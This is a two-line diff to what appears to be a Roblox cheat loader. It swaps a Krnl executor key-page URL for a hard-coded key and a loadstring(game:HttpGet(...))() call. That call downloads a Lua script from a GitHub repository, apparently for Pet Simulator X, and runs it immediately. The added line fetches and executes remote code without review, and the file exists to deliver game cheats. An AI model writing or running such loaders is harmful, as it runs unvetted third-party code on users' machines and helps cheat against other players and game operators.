@@ -1,1 +1,2 @@
-https://cdn.krnl.place/getkey.php
+_G.Key = "HClR_veD"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
